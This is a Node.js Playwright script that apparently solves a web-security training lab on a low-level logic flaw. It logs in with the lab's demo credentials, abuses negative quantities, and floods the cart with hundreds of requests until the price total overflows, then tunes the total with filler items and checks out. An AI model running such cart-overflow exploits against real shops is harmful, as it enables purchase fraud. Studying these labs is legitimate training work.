const { runLab } = require('./_common.cjs');

const TITLE = 'Low-level logic flaw';
const PATH = '/web-security/logic-flaws/examples/lab-logic-flaws-low-level';

function parseMoneyToCents(value) {
  const normalized = String(value || '').replace(/[^\d.-]/g, '');
  if (!normalized) return 0;
  return Math.round(Number(normalized) * 100);
}

function chunkQuantity(total, maxPerRequest = 99) {
  const chunks = [];
  let remaining = total;
  while (remaining > 0) {
    const next = Math.min(remaining, maxPerRequest);
    chunks.push(next);
    remaining -= next;
  }
  return chunks;
}

async function readCartTotalCents(page, labUrl) {
  await page.goto(labUrl + '/cart', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const html = await page.content();
  const values = html.match(/-?\$[\d,]+(?:\.\d{2})?|\$-?[\d,]+(?:\.\d{2})?/g) || [];
  return parseMoneyToCents(values.at(-1) || '0');
}

async function placeOrder(page, labUrl) {
  await page.goto(labUrl + '/cart', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const csrf = await page.locator('[name="csrf"]').first().inputValue().catch(() => '');
  await page.evaluate(async (csrfToken) => {
    const body = new URLSearchParams();
    if (csrfToken) body.set('csrf', csrfToken);
    await fetch('/cart/checkout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
      credentials: 'include',
    });
  }, csrf);
  await page.waitForTimeout(1000);
}

function buildCoinPlan(products, minTarget, maxTarget) {
  const best = Array(maxTarget + 1).fill(null);
  best[0] = [];
  for (let amount = 0; amount <= maxTarget; amount += 1) {
    if (!best[amount]) continue;
    for (const product of products) {
      const next = amount + product.priceCents;
      if (next > maxTarget || best[next]) continue;
      best[next] = [...best[amount], product.productId];
    }
  }
  for (let target = minTarget; target <= maxTarget; target += 1) {
    if (!best[target]) continue;
    const counts = {};
    for (const productId of best[target]) {
      counts[productId] = (counts[productId] || 0) + 1;
    }
    return { target, counts };
  }
  return null;
}

async function addCartRequests(page, labUrl, productId, totalRequests, quantityPerRequest, batchSize = 50) {
  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  let remaining = totalRequests;
  while (remaining > 0) {
    const currentBatch = Math.min(batchSize, remaining);
    await page.evaluate(async ({ productId, quantityPerRequest, currentBatch }) => {
      for (let i = 0; i < currentBatch; i += 1) {
        // eslint-disable-next-line no-await-in-loop
        await fetch('/cart', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            productId: String(productId),
            redir: 'PRODUCT',
            quantity: String(quantityPerRequest),
          }).toString(),
          credentials: 'include',
        });
      }
    }, { productId, quantityPerRequest, currentBatch });
    remaining -= currentBatch;
  }
}

async function clearCart(page, labUrl, productIds) {
  await page.goto(labUrl + '/cart', { waitUntil: 'domcontentloaded', timeout: 15000 });
  await page.evaluate(async ({ productIds }) => {
    for (const productId of productIds) {
      // eslint-disable-next-line no-await-in-loop
      await fetch('/cart', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          productId: String(productId),
          redir: 'CART',
          quantity: '-999999',
        }).toString(),
        credentials: 'include',
      });
    }
  }, { productIds });
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.fill('input[name="username"]', 'wiener');
    await page.fill('input[name="password"]', 'peter');
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('button[type="submit"], input[type="submit"]'),
    ]);

    await page.goto(labUrl + '/', { waitUntil: 'domcontentloaded', timeout: 15000 });
    const products = await page.evaluate(() => {
      const money = /\$\s*-?[\d,]+(?:\.\d{2})?/;
      return [...document.querySelectorAll('a[href*="/product?productId="]')].map((anchor) => {
        const href = anchor.getAttribute('href') || '';
        const productId = href.match(/productId=(\d+)/)?.[1] || '';
        const container = anchor.closest('section, article, div, li') || anchor.parentElement || anchor;
        const text = (container.textContent || '').replace(/\s+/g, ' ').trim();
        const priceText = text.match(money)?.[0] || '';
        return {
          productId,
          name: text.replace(priceText, '').replace(/View details/i, '').trim(),
          priceText,
        };
      }).filter((item) => item.productId && item.name && item.priceText);
    });

    const enriched = products.map((product) => ({
      ...product,
      priceCents: parseMoneyToCents(product.priceText),
    }));
    const jacket = enriched.find((product) => /l33t|leather jacket/i.test(product.name));
    if (!jacket) {
      throw new Error('Leather jacket product not found');
    }

    await clearCart(page, labUrl, enriched.map((product) => product.productId));

    await addCartRequests(page, labUrl, jacket.productId, 324, 99, 50);
    await addCartRequests(page, labUrl, jacket.productId, 1, 47, 1);

    const minTarget = 122197;
    const maxTarget = 132195;
    const fillerProducts = enriched.filter((product) => product.productId !== jacket.productId && product.priceCents > 0);
    const plan = buildCoinPlan(fillerProducts, minTarget, maxTarget);
    if (!plan) {
      throw new Error('No filler product combination found to reach positive credit range');
    }
    console.log(`filler target cents: ${plan.target}`);
    console.log(`filler counts: ${JSON.stringify(plan.counts)}`);

    for (const [productId, quantity] of Object.entries(plan.counts)) {
        for (const chunk of chunkQuantity(quantity)) {
          // eslint-disable-next-line no-await-in-loop
          await addCartRequests(page, labUrl, productId, 1, chunk, 1);
        }
      }

    const finalTotalCents = await readCartTotalCents(page, labUrl);
    console.log(`final cart total cents: ${finalTotalCents}`);

    await placeOrder(page, labUrl);
  },
});
